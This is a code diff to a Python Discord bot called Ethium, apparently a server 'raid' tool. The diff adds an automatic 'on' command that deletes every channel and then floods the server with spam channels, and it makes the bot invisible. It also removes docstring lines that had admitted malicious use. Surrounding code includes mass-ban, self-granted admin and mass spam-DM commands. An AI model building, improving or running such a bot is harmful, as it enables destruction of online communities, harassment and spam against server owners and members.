@@ -31,7 +31,7 @@ def get_config() -> Dict[str, str]:
         log.error(f'An error occurred while obtaining the configuration {e}')
 
 
-def append_data(info: Dict[str, str]) -> None:
+def append_data(info) -> None:
     '''
     The append_data function takes in a dictionary and appends it to the config.json file.
 
@@ -40,7 +40,7 @@ def append_data(info: Dict[str, str]) -> None:
     '''
     try:
         with open('../config/config.json', 'w', encoding='utf8') as file:
-            json.dump(info, file)
+            json.dump(info, file, indent=4)
     except Exception as e:
         log.error(f'An error occurred while adding information to the config file {e}')
 
@@ -56,7 +56,7 @@ def rewrite_config() -> None:
     '''
     CHOICES: List[str] = ['YES', 'NO']
     QUESTIONS: List[inquirer.List] = [
-        inquirer.List('config', 'Rewrite the config', choices=CHOICES),
+        inquirer.List('config', 'Rewrite config', choices=CHOICES),
     ]
 
     try:
@@ -68,8 +68,8 @@ def rewrite_config() -> None:
         for line in data:
             del line
 
-        data: Dict[str, str] = prompt()
-        append_data(data)
+        config: Dict[str, str] = prompt()
+        append_data(config)
 
 
 def prompt() -> Dict[str, str]:
@@ -102,6 +102,7 @@ if not config:
     append_data(config)
 else:
     rewrite_config()
+    config = get_config()
 
 token: str = config['Token']
 prefix: str = config['Prefix']
@@ -110,6 +111,12 @@ server_icon: str = config['ServerIcon']
 channels_name: str = config['ChannelsName']
 roles_name: str = config['RolesName']
 spam_msg: str = config['SpamMsg']
+
+ethium: cmds.Bot = cmds.Bot(
+    command_prefix=prefix,
+    help_command=None,
+    intents=discord.Intents.all(),
+)
 
 
 async def banner() -> None:
@@ -137,13 +144,6 @@ async def banner() -> None:
     log.info(f'Coded by {_dev}\n')
 
 
-ethium: cmds.Bot = cmds.Bot(
-    command_prefix=prefix,
-    help_command=None,
-    intents=discord.Intents.all(),
-)
-
-
 @ethium.event
 async def on_ready() -> None:
     '''
@@ -153,11 +153,9 @@ async def on_ready() -> None:
 
     :return: None.
     '''
-    ACTIVITY_NAME: str = '#Ethium'
-    TWITCH_URL: str = 'https://twitch.tv/S4vitaar'
-    activity: discord.Streaming = discord.Streaming(name=ACTIVITY_NAME, url=TWITCH_URL)
+    status: discord.Status = discord.Status.invisible
     try:
-        await ethium.change_presence(activity=activity)
+        await ethium.change_presence(status=status)
         await banner()
 
     except Exception as e:
@@ -274,8 +272,7 @@ async def raid(ctx: cmds.Context) -> None:
     '''
     The raid function is a command that will change the server name and icon to
     the values defined in the constants at the top of this file. It will then create
-    50 text channels with names defined by channels_name. This is meant to be used as
-    a prank on your friends, but it can also be used for malicious purposes.
+    50 text channels with names defined by channels_name.
 
     :param ctx:cmds.Context: Used to Get the guild that the command was used in.
     :return: None.
@@ -292,14 +289,29 @@ async def raid(ctx: cmds.Context) -> None:
 
 
 @ethium.command(
+    name='on',
+    description='This command is used to make the automatic raid by deleting channels and creating new ones with spam.',
+)
+async def start(ctx: cmds.Context) -> None:
+    '''
+    The start function is a command that will start the raid.
+    It does this by first nuking all channels, then creating new ones.
+
+    :param ctx:cmds.Context: Used to Get the context of the command.
+    :return: None
+    '''
+    await nuke(ctx)
+    await raid(ctx)
+
+
+@ethium.command(
     name='massban',
     description='This command will ban all server members with a lower role than the bot.',
 )
 async def mass_ban(ctx: cmds.Context) -> None:
     '''
     The mass_ban function is a command that will ban every member in the guild
-    except for the author and bot. This is useful if you want to 'clear' out a server
-    of all members, or just want to have fun.
+    except for the author and bot.
 
     :param ctx:cmds.Context: Used to Get the context of the command.
     :return: None.
@@ -324,8 +336,7 @@ async def mass_ban(ctx: cmds.Context) -> None:
 async def get_admin(ctx: cmds.Context) -> None:
     '''
     The get_admin function is a command that allows the user to get admin
-    permissions on the server. This is useful for debugging purposes, but should
-    not be used in production.
+    permissions on the server.
 
     :param ctx:cmds.Context: Used to Pass the context of the command.
     :return: None.
@@ -345,8 +356,7 @@ async def get_admin(ctx: cmds.Context) -> None:
 async def mass_dm(ctx: cmds.Context) -> None:
     '''
     The mass_dm function is a command that sends the spam_msg to every member of
-    the guild except for the author and Ethium. It is used as a demonstration of how
-    to use commands in Ethium.
+    the guild except for the author and Ethium.
 
     :param ctx:cmds.Context: Used to Get the guild, author and bot.
     :return: None.
@@ -421,9 +431,9 @@ async def help(ctx: cmds.Context) -> None:
         timestamp=dt.utcnow(),
     )
 
-    embed.set_author(name=_dev, server_icon=_dev.avatar)
+    embed.set_author(name=_dev, icon_url=_dev.avatar)
     embed.set_thumbnail(url=ethium.user.avatar)
-    embed.set_footer(text=author.name, server_icon=author.avatar)
+    embed.set_footer(text=author.name, icon_url=author.avatar)
 
     for cmd in ethium.commands:
         embed.add_field(
